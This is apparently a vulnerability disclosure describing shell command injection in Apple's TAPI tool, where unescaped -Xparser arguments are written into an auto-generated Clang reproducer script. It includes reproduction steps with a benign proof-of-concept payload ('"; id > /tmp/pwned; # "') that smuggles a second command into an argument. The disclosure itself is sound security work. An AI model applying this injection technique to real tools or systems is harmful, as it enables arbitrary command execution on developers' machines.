# Arbitrary Shell Command Execution upon Execution of TAPI Auto Generated Reproducer Script

## How it works

A shell command injection vulnerability exists in the Apple TAPI (tapi) tool. When the tool encounters a header parsing failure, it generates a "reproducer" shell script intended to help developers debug the issue with Clang.
However, the tool insecurely concatenates command-line arguments into this script without performing any escaping of shell metacharacters, specifically double quotes.
An attacker can provide a crafted argument via the -Xparser flag that breaks out of the intended quoting and executes arbitrary shell commands when the reproducer script is run.

## Steps To Reproduce

1. Create a directory structure for a test SDK: mkdir -p sdk/usr/lib sdk/usr/include.
2. Create a test dylib: echo "int f(){}" | clang -dynamiclib -x c - -o sdk/usr/lib/libf.dylib.
3. Create a header with a syntax error: echo "syntax_error" > sdk/usr/include/f.h.
4. Run tapi sdkdb with an injection payload: xcrun tapi sdkdb --runtime-root sdk --sdk-content-root sdk -o out -Xparser "; id > /tmp/pwned; # " --target=arm64-apple-macos
5. Observe that a reproducer script is generated in /tmp/tapi_include_headers-XXXXXX.sh.
6. Run the generated script: sh /tmp/tapi_include_headers-XXXXXX.sh.

## Expected results

The arguments passed to Clang in the generated shell script should be properly escaped to prevent shell injection.

## Actual results

The payload "; id > /tmp/pwned; # " is written verbatim into the script, resulting in: "clang" ... ""; id > /tmp/pwned; # "" ... The id command is executed when the script is run.


## No CVE was assigned. Patch released on Xcode 27 additional recognition.
